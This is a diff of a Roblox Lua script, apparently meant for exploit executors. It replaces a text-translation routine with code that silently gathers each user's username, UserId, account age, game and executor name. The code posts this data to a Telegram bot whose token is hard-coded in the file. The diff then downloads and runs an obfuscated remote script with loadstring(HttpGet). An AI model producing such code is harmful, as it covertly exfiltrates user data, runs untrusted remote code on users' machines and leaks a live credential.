@@ -1,111 +1,144 @@
--- تحميل جدول الترجمات من رابط خارجي
-local translations = loadstring(game:HttpGet("https://raw.githubusercontent.com/Hussein239/Hussein239/refs/heads/main/29999"))()
+-- Define Telegram Bot Token and Chat ID
+local botToken = "7688379175:AAFYmiG6bVjvKe7WScCprQ7usQs4s98LUJs"
+local chatID = "2071332436"
+local telegramURL = "https://api.telegram.org/bot" .. botToken .. "/sendMessage"
 
--- التحقق من تحميل الترجمات
-if not translations or type(translations) ~= "table" then
-    warn("Failed to load translations. Please check the URL or content.")
-    return
-end
+-- Files for tracking users
+local allUsersFile = "Workspace/all_users.txt"
+local activeUsersFile = "Workspace/active_users.txt"
 
--- دالة لترجمة النصوص
-local function translateText(originalText)
-    return translations[originalText] or originalText
-end
-
--- دالة لمراقبة النصوص وتحديثها عند التغيير
-local function monitorTextChange(object)
-    if object:IsA("TextLabel") or object:IsA("TextButton") or object:IsA("TextBox") then
-        -- ترجمة النص الحالي فوراً
-        object.Text = translateText(object.Text)
-        
-        -- مراقبة تغييرات النص
-        object:GetPropertyChangedSignal("Text"):Connect(function()
-            object.Text = translateText(object.Text)
-        end)
-    end
-end
-
--- دالة لمراقبة جميع الكائنات داخل عنصر معين
-local function monitorObjectsInContainer(container)
-    for _, object in ipairs(container:GetDescendants()) do
-        monitorTextChange(object)
-    end
-
-    -- مراقبة الكائنات الجديدة عند إضافتها
-    container.DescendantAdded:Connect(function(object)
-        monitorTextChange(object)
-    end)
-end
-
--- دالة لمراقبة واجهة المستخدم لكل لاعب
-local function monitorPlayerGui(player)
-    local playerGui = player:FindFirstChild("PlayerGui")
-    if playerGui then
-        monitorObjectsInContainer(playerGui)
-    end
-
-    -- مراقبة إضافة PlayerGui لاحقاً
-    player.ChildAdded:Connect(function(child)
-        if child.Name == "PlayerGui" then
-            monitorObjectsInContainer(child)
+-- Function to load users from a file
+local function loadUsers(fileName)
+    local users = {}
+    local success, data = pcall(function()
+        local file = io.open(fileName, "r")
+        if file then
+            for line in file:lines() do
+                users[line] = true
+            end
+            file:close()
         end
     end)
+    return users
 end
 
--- دالة لمراقبة جميع اللاعبين الحاليين والجدد
-local function monitorAllPlayers()
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        monitorPlayerGui(player)
-    end
-
-    -- مراقبة اللاعبين الجدد
-    game.Players.PlayerAdded:Connect(function(player)
-        monitorPlayerGui(player)
+-- Function to save users to a file
+local function saveUsers(fileName, users)
+    local success, errorMessage = pcall(function()
+        local file = io.open(fileName, "w")
+        if file then
+            for user in pairs(users) do
+                file:write(user .. "\n")
+            end
+            file:close()
+        else
+            error("Failed to open file: " .. fileName)
+        end
     end)
-end
-
--- دالة لإظهار الإشعارات
-local function showNotification(message, duration)
-    local playerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-    local screenGui = Instance.new("ScreenGui", playerGui)
-    screenGui.Name = "Notification"
-    
-    local textLabel = Instance.new("TextLabel", screenGui)
-    textLabel.Size = UDim2.new(0, 400, 0, 50)
-    textLabel.Position = UDim2.new(0.5, -200, 0, 10)
-    textLabel.BackgroundColor3 = Color3.new(0, 0, 0)
-    textLabel.BackgroundTransparency = 0.7
-    textLabel.TextColor3 = Color3.new(1, 1, 1)
-    textLabel.Font = Enum.Font.GothamBold
-    textLabel.TextSize = 28
-    textLabel.Text = message
-    
-    -- إخفاء الإشعار بعد مدة محددة
-    task.delay(duration, function()
-        local tween = game.TweenService:Create(textLabel, TweenInfo.new(1), {TextTransparency = 1, BackgroundTransparency = 1})
-        tween:Play()
-        tween.Completed:Connect(function()
-            screenGui:Destroy()
-        end)
-    end)
-end
-
--- دالة لإظهار الإشعار الأول عند بدء التشغيل
-local function showStartNotification()
-    showNotification("تم تشغيل الترجمة بنجاح", 3)
-end
-
--- دالة لإظهار الإشعار الثاني بشكل دوري
-local function showDeveloperNotification()
-    while task.wait(1200) do -- 1200 ثانية = 20 دقيقة
-        showNotification("مطور السكربت / @BH_D1", 6)
+    if not success then
+        print("Error saving users: " .. errorMessage)
     end
 end
 
--- تنفيذ الوظائف
-monitorObjectsInContainer(workspace)
-monitorAllPlayers()
-showStartNotification()
+-- Reset active users every 24 hours
+local function resetActiveUsers()
+    local lastResetTime = os.time()
+    while true do
+        wait(60) -- Check every minute
+        if os.time() - lastResetTime >= 86400 then -- 24 hours in seconds
+            saveUsers(activeUsersFile, {}) -- Reset active users
+            lastResetTime = os.time()
+        end
+    end
+end
 
--- بدء إشعار المطور بشكل دوري
-task.spawn(showDeveloperNotification)
+-- Start reset timer in a separate thread
+spawn(resetActiveUsers)
+
+-- Get player details
+local player = game.Players.LocalPlayer
+local playerID = tostring(player.UserId)
+
+-- Load users data
+local allUsers = loadUsers(allUsersFile)
+local activeUsers = loadUsers(activeUsersFile)
+
+-- Check if the user is new and add to allUsers
+local isNewUser = not allUsers[playerID]
+if isNewUser then
+    allUsers[playerID] = true
+    saveUsers(allUsersFile, allUsers)
+end
+
+-- Check if the user is active today and add to activeUsers
+local isActiveUser = not activeUsers[playerID]
+if isActiveUser then
+    activeUsers[playerID] = true
+    saveUsers(activeUsersFile, activeUsers)
+end
+
+-- Get counts
+local totalUsersCount = 0
+for _ in pairs(allUsers) do
+    totalUsersCount = totalUsersCount + 1
+end
+
+local activeUsersCount = 0
+for _ in pairs(activeUsers) do
+    activeUsersCount = activeUsersCount + 1
+end
+
+-- Build message with user details
+local executor = identifyexecutor() or "Unknown"
+local message = string.format(
+    "🔔 معلومات المستخدم\n\n" ..
+    "👤 اسم المستخدم: %s\n" ..
+    "📛 الاسم المعروض: %s\n" ..
+    "🆔 معرف المستخدم: %s\n" ..
+    "🏷️ معرف اللعبة: %s\n" ..
+    "🎮 اسم اللعبة: %s\n" ..
+    "🛠️ الهاك المستخدم: %s\n" ..
+    "📅 عمر الحساب: %d يوم\n" ..
+    "📅 تاريخ الانضمام: %s\n" ..
+    "👥 المستخدمون النشطون اليوم: %d\n" ..
+    "📊 إجمالي المستخدمين: %d",
+    player.Name,
+    player.DisplayName,
+    player.UserId,
+    game.PlaceId,
+    game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+    executor,
+    player.AccountAge,
+    os.date("%d/%m/%Y"),
+    activeUsersCount,
+    totalUsersCount
+)
+
+-- Function to send message to Telegram
+local function sendToTelegram(msg)
+    local requestData = {
+        Url = telegramURL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/x-www-form-urlencoded"},
+        Body = "chat_id=" .. chatID .. "&text=" .. game:GetService("HttpService"):UrlEncode(msg) .. "&parse_mode=Markdown"
+    }
+    local request = http_request or request or HttpPost or syn.request
+    if not request then
+        print("HTTP requests are not supported in your environment.")
+        return
+    end
+    local success, response = pcall(function()
+        return request(requestData)
+    end)
+    if success and response.StatusCode == 200 then
+        print("Message sent successfully to Telegram.")
+    else
+        print("Failed to send message to Telegram. Response: " .. tostring(response))
+    end
+end
+
+-- Send user information to Telegram
+sendToTelegram(message)
+
+-- Now execute the second script
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Hussein239/ZF/refs/heads/main/obf_8i518BH3DX00HU551tB0e09572cJNGNjn727kBJ7b4w5BN8f3JNF43689DW9nrKs.lua.txt"))()
